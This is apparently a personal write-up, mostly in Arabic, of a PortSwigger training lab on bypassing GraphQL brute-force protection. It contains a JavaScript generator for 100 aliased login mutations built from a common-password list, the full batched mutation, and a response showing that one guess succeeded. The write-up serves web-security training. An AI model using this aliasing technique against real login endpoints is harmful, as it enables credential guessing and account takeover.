# Lab : Bypassing GraphQL brute force protections

https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass

- الفكره من الLab ده ان المفروض اعمل brute force بس بطريقه زكيه شويه اني ابعت كل الاحتمالات مره واحده و الي يجي صح يبعت true  هنمشي علي الخطوات الي مشينا عيها في الlabs  التانيه فا هتخطاها

```bash
1. copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
ده هيعمل كل الاحتمالات ويحطها في النسخ عندي 

2. 
bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }

bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }

bruteforce2:login(input:{password: "12345678", username: "carlos"}) {
        token
        success
    }

bruteforce3:login(input:{password: "qwerty", username: "carlos"}) {
        token
        success
    }

bruteforce4:login(input:{password: "123456789", username: "carlos"}) {
        token
        success
    }

bruteforce5:login(input:{password: "12345", username: "carlos"}) {
        token
        success
    }

bruteforce6:login(input:{password: "1234", username: "carlos"}) {
        token
        success
    }

bruteforce7:login(input:{password: "111111", username: "carlos"}) {
        token
        success
    }

bruteforce8:login(input:{password: "1234567", username: "carlos"}) {
        token
        success
    }

bruteforce9:login(input:{password: "dragon", username: "carlos"}) {
        token
        success
    }

bruteforce10:login(input:{password: "123123", username: "carlos"}) {
        token
        success
    }

bruteforce11:login(input:{password: "baseball", username: "carlos"}) {
        token
        success
    }

bruteforce12:login(input:{password: "abc123", username: "carlos"}) {
        token
        success
    }

bruteforce13:login(input:{password: "football", username: "carlos"}) {
        token
        success
    }

bruteforce14:login(input:{password: "monkey", username: "carlos"}) {
        token
        success
    }

bruteforce15:login(input:{password: "letmein", username: "carlos"}) {
        token
        success
    }

bruteforce16:login(input:{password: "shadow", username: "carlos"}) {
        token
        success
    }

bruteforce17:login(input:{password: "master", username: "carlos"}) {
        token
        success
    }

bruteforce18:login(input:{password: "666666", username: "carlos"}) {
        token
        success
    }

bruteforce19:login(input:{password: "qwertyuiop", username: "carlos"}) {
        token
        success
    }

bruteforce20:login(input:{password: "123321", username: "carlos"}) {
        token
        success
    }

bruteforce21:login(input:{password: "mustang", username: "carlos"}) {
        token
        success
    }

bruteforce22:login(input:{password: "1234567890", username: "carlos"}) {
        token
        success
    }

bruteforce23:login(input:{password: "michael", username: "carlos"}) {
        token
        success
    }

bruteforce24:login(input:{password: "654321", username: "carlos"}) {
        token
        success
    }

bruteforce25:login(input:{password: "superman", username: "carlos"}) {
        token
        success
    }

bruteforce26:login(input:{password: "1qaz2wsx", username: "carlos"}) {
        token
        success
    }

bruteforce27:login(input:{password: "7777777", username: "carlos"}) {
        token
        success
    }

bruteforce28:login(input:{password: "121212", username: "carlos"}) {
        token
        success
    }

bruteforce29:login(input:{password: "000000", username: "carlos"}) {
        token
        success
    }

bruteforce30:login(input:{password: "qazwsx", username: "carlos"}) {
        token
        success
    }

bruteforce31:login(input:{password: "123qwe", username: "carlos"}) {
        token
        success
    }

bruteforce32:login(input:{password: "killer", username: "carlos"}) {
        token
        success
    }

bruteforce33:login(input:{password: "trustno1", username: "carlos"}) {
        token
        success
    }

bruteforce34:login(input:{password: "jordan", username: "carlos"}) {
        token
        success
    }

bruteforce35:login(input:{password: "jennifer", username: "carlos"}) {
        token
        success
    }

bruteforce36:login(input:{password: "zxcvbnm", username: "carlos"}) {
        token
        success
    }

bruteforce37:login(input:{password: "asdfgh", username: "carlos"}) {
        token
        success
    }

bruteforce38:login(input:{password: "hunter", username: "carlos"}) {
        token
        success
    }

bruteforce39:login(input:{password: "buster", username: "carlos"}) {
        token
        success
    }

bruteforce40:login(input:{password: "soccer", username: "carlos"}) {
        token
        success
    }

bruteforce41:login(input:{password: "harley", username: "carlos"}) {
        token
        success
    }

bruteforce42:login(input:{password: "batman", username: "carlos"}) {
        token
        success
    }

bruteforce43:login(input:{password: "andrew", username: "carlos"}) {
        token
        success
    }

bruteforce44:login(input:{password: "tigger", username: "carlos"}) {
        token
        success
    }

bruteforce45:login(input:{password: "sunshine", username: "carlos"}) {
        token
        success
    }

bruteforce46:login(input:{password: "iloveyou", username: "carlos"}) {
        token
        success
    }

bruteforce47:login(input:{password: "2000", username: "carlos"}) {
        token
        success
    }

bruteforce48:login(input:{password: "charlie", username: "carlos"}) {
        token
        success
    }

bruteforce49:login(input:{password: "robert", username: "carlos"}) {
        token
        success
    }

bruteforce50:login(input:{password: "thomas", username: "carlos"}) {
        token
        success
    }

bruteforce51:login(input:{password: "hockey", username: "carlos"}) {
        token
        success
    }

bruteforce52:login(input:{password: "ranger", username: "carlos"}) {
        token
        success
    }

bruteforce53:login(input:{password: "daniel", username: "carlos"}) {
        token
        success
    }

bruteforce54:login(input:{password: "starwars", username: "carlos"}) {
        token
        success
    }

bruteforce55:login(input:{password: "klaster", username: "carlos"}) {
        token
        success
    }

bruteforce56:login(input:{password: "112233", username: "carlos"}) {
        token
        success
    }

bruteforce57:login(input:{password: "george", username: "carlos"}) {
        token
        success
    }

bruteforce58:login(input:{password: "computer", username: "carlos"}) {
        token
        success
    }

bruteforce59:login(input:{password: "michelle", username: "carlos"}) {
        token
        success
    }

bruteforce60:login(input:{password: "jessica", username: "carlos"}) {
        token
        success
    }

bruteforce61:login(input:{password: "pepper", username: "carlos"}) {
        token
        success
    }

bruteforce62:login(input:{password: "1111", username: "carlos"}) {
        token
        success
    }

bruteforce63:login(input:{password: "zxcvbn", username: "carlos"}) {
        token
        success
    }

bruteforce64:login(input:{password: "555555", username: "carlos"}) {
        token
        success
    }

bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
        token
        success
    }

bruteforce66:login(input:{password: "131313", username: "carlos"}) {
        token
        success
    }

bruteforce67:login(input:{password: "freedom", username: "carlos"}) {
        token
        success
    }

bruteforce68:login(input:{password: "777777", username: "carlos"}) {
        token
        success
    }

bruteforce69:login(input:{password: "pass", username: "carlos"}) {
        token
        success
    }

bruteforce70:login(input:{password: "maggie", username: "carlos"}) {
        token
        success
    }

bruteforce71:login(input:{password: "159753", username: "carlos"}) {
        token
        success
    }

bruteforce72:login(input:{password: "aaaaaa", username: "carlos"}) {
        token
        success
    }

bruteforce73:login(input:{password: "ginger", username: "carlos"}) {
        token
        success
    }

bruteforce74:login(input:{password: "princess", username: "carlos"}) {
        token
        success
    }

bruteforce75:login(input:{password: "joshua", username: "carlos"}) {
        token
        success
    }

bruteforce76:login(input:{password: "cheese", username: "carlos"}) {
        token
        success
    }

bruteforce77:login(input:{password: "amanda", username: "carlos"}) {
        token
        success
    }

bruteforce78:login(input:{password: "summer", username: "carlos"}) {
        token
        success
    }

bruteforce79:login(input:{password: "love", username: "carlos"}) {
        token
        success
    }

bruteforce80:login(input:{password: "ashley", username: "carlos"}) {
        token
        success
    }

bruteforce81:login(input:{password: "nicole", username: "carlos"}) {
        token
        success
    }

bruteforce82:login(input:{password: "chelsea", username: "carlos"}) {
        token
        success
    }

bruteforce83:login(input:{password: "biteme", username: "carlos"}) {
        token
        success
    }

bruteforce84:login(input:{password: "matthew", username: "carlos"}) {
        token
        success
    }

bruteforce85:login(input:{password: "access", username: "carlos"}) {
        token
        success
    }

bruteforce86:login(input:{password: "yankees", username: "carlos"}) {
        token
        success
    }

bruteforce87:login(input:{password: "987654321", username: "carlos"}) {
        token
        success
    }

bruteforce88:login(input:{password: "dallas", username: "carlos"}) {
        token
        success
    }

bruteforce89:login(input:{password: "austin", username: "carlos"}) {
        token
        success
    }

bruteforce90:login(input:{password: "thunder", username: "carlos"}) {
        token
        success
    }

bruteforce91:login(input:{password: "taylor", username: "carlos"}) {
        token
        success
    }

bruteforce92:login(input:{password: "matrix", username: "carlos"}) {
        token
        success
    }

bruteforce93:login(input:{password: "mobilemail", username: "carlos"}) {
        token
        success
    }

bruteforce94:login(input:{password: "mom", username: "carlos"}) {
        token
        success
    }

bruteforce95:login(input:{password: "monitor", username: "carlos"}) {
        token
        success
    }

bruteforce96:login(input:{password: "monitoring", username: "carlos"}) {
        token
        success
    }

bruteforce97:login(input:{password: "montana", username: "carlos"}) {
        token
        success
    }

bruteforce98:login(input:{password: "moon", username: "carlos"}) {
        token
        success
    }

bruteforce99:login(input:{password: "moscow", username: "carlos"}) {
        token
        success
    }

3. mutation {

bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }

bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }

bruteforce2:login(input:{password: "12345678", username: "carlos"}) {
        token
        success
    }

bruteforce3:login(input:{password: "qwerty", username: "carlos"}) {
        token
        success
    }

bruteforce4:login(input:{password: "123456789", username: "carlos"}) {
        token
        success
    }

bruteforce5:login(input:{password: "12345", username: "carlos"}) {
        token
        success
    }

bruteforce6:login(input:{password: "1234", username: "carlos"}) {
        token
        success
    }

bruteforce7:login(input:{password: "111111", username: "carlos"}) {
        token
        success
    }

bruteforce8:login(input:{password: "1234567", username: "carlos"}) {
        token
        success
    }

bruteforce9:login(input:{password: "dragon", username: "carlos"}) {
        token
        success
    }

bruteforce10:login(input:{password: "123123", username: "carlos"}) {
        token
        success
    }

bruteforce11:login(input:{password: "baseball", username: "carlos"}) {
        token
        success
    }

bruteforce12:login(input:{password: "abc123", username: "carlos"}) {
        token
        success
    }

bruteforce13:login(input:{password: "football", username: "carlos"}) {
        token
        success
    }

bruteforce14:login(input:{password: "monkey", username: "carlos"}) {
        token
        success
    }

bruteforce15:login(input:{password: "letmein", username: "carlos"}) {
        token
        success
    }

bruteforce16:login(input:{password: "shadow", username: "carlos"}) {
        token
        success
    }

bruteforce17:login(input:{password: "master", username: "carlos"}) {
        token
        success
    }

bruteforce18:login(input:{password: "666666", username: "carlos"}) {
        token
        success
    }

bruteforce19:login(input:{password: "qwertyuiop", username: "carlos"}) {
        token
        success
    }

bruteforce20:login(input:{password: "123321", username: "carlos"}) {
        token
        success
    }

bruteforce21:login(input:{password: "mustang", username: "carlos"}) {
        token
        success
    }

bruteforce22:login(input:{password: "1234567890", username: "carlos"}) {
        token
        success
    }

bruteforce23:login(input:{password: "michael", username: "carlos"}) {
        token
        success
    }

bruteforce24:login(input:{password: "654321", username: "carlos"}) {
        token
        success
    }

bruteforce25:login(input:{password: "superman", username: "carlos"}) {
        token
        success
    }

bruteforce26:login(input:{password: "1qaz2wsx", username: "carlos"}) {
        token
        success
    }

bruteforce27:login(input:{password: "7777777", username: "carlos"}) {
        token
        success
    }

bruteforce28:login(input:{password: "121212", username: "carlos"}) {
        token
        success
    }

bruteforce29:login(input:{password: "000000", username: "carlos"}) {
        token
        success
    }

bruteforce30:login(input:{password: "qazwsx", username: "carlos"}) {
        token
        success
    }

bruteforce31:login(input:{password: "123qwe", username: "carlos"}) {
        token
        success
    }

bruteforce32:login(input:{password: "killer", username: "carlos"}) {
        token
        success
    }

bruteforce33:login(input:{password: "trustno1", username: "carlos"}) {
        token
        success
    }

bruteforce34:login(input:{password: "jordan", username: "carlos"}) {
        token
        success
    }

bruteforce35:login(input:{password: "jennifer", username: "carlos"}) {
        token
        success
    }

bruteforce36:login(input:{password: "zxcvbnm", username: "carlos"}) {
        token
        success
    }

bruteforce37:login(input:{password: "asdfgh", username: "carlos"}) {
        token
        success
    }

bruteforce38:login(input:{password: "hunter", username: "carlos"}) {
        token
        success
    }

bruteforce39:login(input:{password: "buster", username: "carlos"}) {
        token
        success
    }

bruteforce40:login(input:{password: "soccer", username: "carlos"}) {
        token
        success
    }

bruteforce41:login(input:{password: "harley", username: "carlos"}) {
        token
        success
    }

bruteforce42:login(input:{password: "batman", username: "carlos"}) {
        token
        success
    }

bruteforce43:login(input:{password: "andrew", username: "carlos"}) {
        token
        success
    }

bruteforce44:login(input:{password: "tigger", username: "carlos"}) {
        token
        success
    }

bruteforce45:login(input:{password: "sunshine", username: "carlos"}) {
        token
        success
    }

bruteforce46:login(input:{password: "iloveyou", username: "carlos"}) {
        token
        success
    }

bruteforce47:login(input:{password: "2000", username: "carlos"}) {
        token
        success
    }

bruteforce48:login(input:{password: "charlie", username: "carlos"}) {
        token
        success
    }

bruteforce49:login(input:{password: "robert", username: "carlos"}) {
        token
        success
    }

bruteforce50:login(input:{password: "thomas", username: "carlos"}) {
        token
        success
    }

bruteforce51:login(input:{password: "hockey", username: "carlos"}) {
        token
        success
    }

bruteforce52:login(input:{password: "ranger", username: "carlos"}) {
        token
        success
    }

bruteforce53:login(input:{password: "daniel", username: "carlos"}) {
        token
        success
    }

bruteforce54:login(input:{password: "starwars", username: "carlos"}) {
        token
        success
    }

bruteforce55:login(input:{password: "klaster", username: "carlos"}) {
        token
        success
    }

bruteforce56:login(input:{password: "112233", username: "carlos"}) {
        token
        success
    }

bruteforce57:login(input:{password: "george", username: "carlos"}) {
        token
        success
    }

bruteforce58:login(input:{password: "computer", username: "carlos"}) {
        token
        success
    }

bruteforce59:login(input:{password: "michelle", username: "carlos"}) {
        token
        success
    }

bruteforce60:login(input:{password: "jessica", username: "carlos"}) {
        token
        success
    }

bruteforce61:login(input:{password: "pepper", username: "carlos"}) {
        token
        success
    }

bruteforce62:login(input:{password: "1111", username: "carlos"}) {
        token
        success
    }

bruteforce63:login(input:{password: "zxcvbn", username: "carlos"}) {
        token
        success
    }

bruteforce64:login(input:{password: "555555", username: "carlos"}) {
        token
        success
    }

bruteforce65:login(input:{password: "11111111", username: "carlos"}) {
        token
        success
    }

bruteforce66:login(input:{password: "131313", username: "carlos"}) {
        token
        success
    }

bruteforce67:login(input:{password: "freedom", username: "carlos"}) {
        token
        success
    }

bruteforce68:login(input:{password: "777777", username: "carlos"}) {
        token
        success
    }

bruteforce69:login(input:{password: "pass", username: "carlos"}) {
        token
        success
    }

bruteforce70:login(input:{password: "maggie", username: "carlos"}) {
        token
        success
    }

bruteforce71:login(input:{password: "159753", username: "carlos"}) {
        token
        success
    }

bruteforce72:login(input:{password: "aaaaaa", username: "carlos"}) {
        token
        success
    }

bruteforce73:login(input:{password: "ginger", username: "carlos"}) {
        token
        success
    }

bruteforce74:login(input:{password: "princess", username: "carlos"}) {
        token
        success
    }

bruteforce75:login(input:{password: "joshua", username: "carlos"}) {
        token
        success
    }

bruteforce76:login(input:{password: "cheese", username: "carlos"}) {
        token
        success
    }

bruteforce77:login(input:{password: "amanda", username: "carlos"}) {
        token
        success
    }

bruteforce78:login(input:{password: "summer", username: "carlos"}) {
        token
        success
    }

bruteforce79:login(input:{password: "love", username: "carlos"}) {
        token
        success
    }

bruteforce80:login(input:{password: "ashley", username: "carlos"}) {
        token
        success
    }

bruteforce81:login(input:{password: "nicole", username: "carlos"}) {
        token
        success
    }

bruteforce82:login(input:{password: "chelsea", username: "carlos"}) {
        token
        success
    }

bruteforce83:login(input:{password: "biteme", username: "carlos"}) {
        token
        success
    }

bruteforce84:login(input:{password: "matthew", username: "carlos"}) {
        token
        success
    }

bruteforce85:login(input:{password: "access", username: "carlos"}) {
        token
        success
    }

bruteforce86:login(input:{password: "yankees", username: "carlos"}) {
        token
        success
    }

bruteforce87:login(input:{password: "987654321", username: "carlos"}) {
        token
        success
    }

bruteforce88:login(input:{password: "dallas", username: "carlos"}) {
        token
        success
    }

bruteforce89:login(input:{password: "austin", username: "carlos"}) {
        token
        success
    }

bruteforce90:login(input:{password: "thunder", username: "carlos"}) {
        token
        success
    }

bruteforce91:login(input:{password: "taylor", username: "carlos"}) {
        token
        success
    }

bruteforce92:login(input:{password: "matrix", username: "carlos"}) {
        token
        success
    }

bruteforce93:login(input:{password: "mobilemail", username: "carlos"}) {
        token
        success
    }

bruteforce94:login(input:{password: "mom", username: "carlos"}) {
        token
        success
    }

bruteforce95:login(input:{password: "monitor", username: "carlos"}) {
        token
        success
    }

bruteforce96:login(input:{password: "monitoring", username: "carlos"}) {
        token
        success
    }

bruteforce97:login(input:{password: "montana", username: "carlos"}) {
        token
        success
    }

bruteforce98:login(input:{password: "moon", username: "carlos"}) {
        token
        success
    }

bruteforce99:login(input:{password: "moscow", username: "carlos"}) {
        token
        success
    }

}

4.    },
    "bruteforce18": {
      "token": "3VUXwHCbU8qWZ93p26pil1bLTLQwZzG6",
      "success": true
    },
```
